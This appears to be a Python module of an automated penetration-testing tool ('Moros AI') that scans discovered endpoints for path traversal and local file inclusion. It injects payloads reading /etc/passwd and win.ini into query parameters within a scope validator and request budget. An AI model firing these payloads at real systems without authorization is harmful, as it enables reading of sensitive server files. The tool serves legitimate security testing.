#!/usr/bin/env python3
"""
run.py — Executable Runner for Path Traversal / LFI in Moros AI.
"""

import argparse
import json
import os
import sys
from pathlib import Path
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

_skill_dir = Path(__file__).parent.resolve()
_project_root = _skill_dir
while _project_root != _project_root.parent:
    if (_project_root / "tools").is_dir() and (_project_root / "run.py").is_file():
        break
    _project_root = _project_root.parent
sys.path.insert(0, str(_project_root / "tools"))

from scope_validator import ScopeValidator
from scoped_http import ScopedHttpClient


def _parse_budget(default: int, cap: int) -> int:
    raw = os.environ.get("MOROS_HTTP_REQUESTS_REMAINING")
    if raw is None or not raw.strip():
        return min(default, cap)
    try:
        return min(max(0, int(raw.strip())), cap)
    except ValueError:
        return min(default, cap)


def _load_endpoints(out_dir: Path) -> list[str]:
    endpoints: list[str] = []
    seen: set[str] = set()

    def _add(ep: str) -> None:
        val = (ep or "").strip()
        if val and val not in seen:
            seen.add(val)
            endpoints.append(val)

    def _from_item(item) -> None:
        if isinstance(item, str):
            _add(item)
        elif isinstance(item, dict):
            url = str(item.get("url") or "").strip()
            if not url:
                path = str(item.get("path") or "").strip()
                base = str(item.get("base_url") or "").strip().rstrip("/")
                url = f"{base}/{path.lstrip('/')}" if base and path else path
            if not url:
                return
            params = item.get("parameters") or []
            param_names = []
            if isinstance(params, list):
                for p in params:
                    name = p.get("name") if isinstance(p, dict) else p
                    if name:
                        param_names.append(str(name).strip())
            if param_names and "?" not in url:
                qs = "&".join(f"{name}=test" for name in param_names[:4])
                _add(f"{url}?{qs}")
            _add(url)

    for rel in [
        "js/endpoints.json",
        "api/endpoints.json",
        "api/openapi-endpoints.json",
        "content-discovery/discovered-paths.json",
        "content/discovered-endpoints.txt",
        "recon/endpoints.txt",
    ]:
        ep_file = out_dir / rel
        if not ep_file.exists():
            continue
        try:
            if ep_file.suffix == ".json":
                data = json.loads(ep_file.read_text(encoding="utf-8"))
                if isinstance(data, list):
                    for item in data:
                        _from_item(item)
                elif isinstance(data, dict):
                    if isinstance(data.get("endpoints"), list):
                        for item in data["endpoints"]:
                            _from_item(item)
                    elif isinstance(data.get("interesting_routes"), list) or isinstance(data.get("paths_checked"), list):
                        for item in (data.get("interesting_routes") or []):
                            _from_item(item)
                        for item in (data.get("paths_checked") or []):
                            if isinstance(item, dict) and item.get("status_code") not in (None, 404):
                                _from_item(item)
            else:
                for line in ep_file.read_text(encoding="utf-8", errors="ignore").splitlines():
                    _add(line)
        except Exception:
            continue
    return [ep for ep in endpoints if "?" in ep]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--target-dir", required=True)
    parser.add_argument("--output-dir", required=True)
    args = parser.parse_args()

    out_dir = Path(args.output_dir)
    findings_dir = out_dir / "findings"
    findings_dir.mkdir(parents=True, exist_ok=True)
    out_file = findings_dir / "candidates-path-traversal.json"

    endpoints = _load_endpoints(out_dir)

    traversal_payloads = [
        ("..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0:"),
        ("../../../../etc/passwd", "root:x:0:0:"),
        ("..\\..\\..\\..\\windows\\win.ini", "[extensions]"),
    ]

    findings = []
    req_budget = _parse_budget(15, 15)

    if req_budget > 0 and endpoints:
        try:
            validator = ScopeValidator(args.target, target_dir=Path(args.target_dir))
            client = ScopedHttpClient(
                target=args.target,
                max_requests=req_budget,
                delay_seconds=0.2,
                scope_validator=validator,
            )
            base_url = client.base_url.rstrip("/")

            stop = False
            for ep in endpoints[:5]:
                if stop:
                    break
                full_url = ep if "://" in ep else f"{base_url}/{ep.lstrip('/')}"
                parsed = urlsplit(full_url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                for param_name in list(params.keys())[:2]:
                    if stop:
                        break
                    for payload, indicator in traversal_payloads:
                        test_params = dict(params)
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, test_query, ""))

                        resp = client.get(test_url)
                        if resp.get("status") in ("budget_exhausted", "blocked_scope"):
                            stop = True
                            break
                        body = resp.get("body", "")

                        if indicator in body.lower():
                            findings.append({
                                "title": f"Path Traversal / Arbitrary File Read in '{param_name}'",
                                "severity": "HIGH",
                                "url": test_url,
                                "cwe": "CWE-22",
                                "evidence": body[:200],
                                "notes": f"System indicator '{indicator}' observed after traversal sequence injection.",
                                "status": "candidate",
                                "validation_status": "unverified",
                                "curl": f"curl -s -i '{test_url}'",
                            })
                            break
        except ValueError as e:
            print(f"Path Traversal check skipped (invalid target/scope): {e}")
        except Exception as e:
            print(f"Path Traversal check notice: {e}")

    out_file.write_text(json.dumps({"findings": findings, "count": len(findings)}, indent=2), encoding="utf-8")
    print(f"Path Traversal check completed: {len(findings)} candidate findings recorded.")


if __name__ == "__main__":
    main()
